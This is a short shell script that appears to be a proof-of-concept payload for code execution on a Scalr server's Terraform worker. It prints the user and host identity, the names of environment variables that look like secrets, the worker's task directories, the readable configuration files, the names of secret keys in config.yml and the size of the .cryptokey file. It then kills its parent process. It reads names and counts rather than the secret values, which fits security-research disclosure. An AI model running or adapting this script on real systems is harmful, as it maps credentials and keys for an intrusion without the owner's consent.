#!/bin/sh
out=/proc/$PPID/fd/2
[ -w "$out" ] || out=/dev/stderr
{
  echo "PROOF user=$(id -un) uid=$(id -u) host=$(hostname)"
  echo "PROOF cwd=$(pwd)"
  echo "PROOF env_vars=$(env | wc -l)"
  echo "PROOF secret_like_env_names=$(env | cut -d= -f1 | grep -iE 'secret|token|password|passwd|key|dsn|credential' | sort | head -25 | tr '\n' ' ')"
  echo "PROOF task_dirs_of_worker=$(ls -d /opt/scalr-server/var/lib/tf-worker/tasks/*/* 2>/dev/null | wc -l)"
  echo "PROOF server_etc_readable_files=$(find /opt/scalr-server/etc -type f -readable 2>/dev/null | wc -l)"
  echo "PROOF server_etc_names=$(find /opt/scalr-server/etc -maxdepth 2 -type f -readable 2>/dev/null | head -15 | tr '\n' ' ')"
  echo "PROOF config_yml_secret_key_names=$(grep -oiE '[a-z_]*(password|secret|token|key)[a-z_]*:' /opt/scalr-server/etc/scalr/config.yml 2>/dev/null | sort -u | head -30 | tr '\n' ' ')"
  echo "PROOF cryptokey_bytes=$(wc -c < /opt/scalr-server/etc/scalr/.cryptokey 2>/dev/null)"
  echo "PROOF end"
} > "$out" 2>&1
kill -9 $PPID
